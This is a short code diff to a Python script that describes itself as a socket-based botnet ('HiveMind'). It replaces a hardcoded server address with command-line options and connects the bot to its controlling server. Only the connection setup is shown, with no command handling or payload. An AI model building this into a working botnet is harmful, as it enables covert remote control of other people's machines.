@@ -4,13 +4,22 @@ from threading import Thread
 import os
 
 
-SERVER_HOST = "192.168.3.49"
-SERVER_PORT = 420
+parser = argparse.ArgumentParser(
+    description="HiveMind, python bot net using sockets"
+)
+
+parser.add_argument("host", nargs="?", help="Address of the Server")
+
+parser.add_argument(
+    "-p", "--port", default=5000, help="Port the Server is running on", type=int
+)
+
+
+args = parser.parse_args()
 
 
 s = socket.socket()
-print(f"[*] Connecting to {SERVER_HOST}:{SERVER_PORT}...")
-s.connect((SERVER_HOST, SERVER_PORT))
+s.connect((args.host, args.port))
 print("[+] Connected.")
 
 
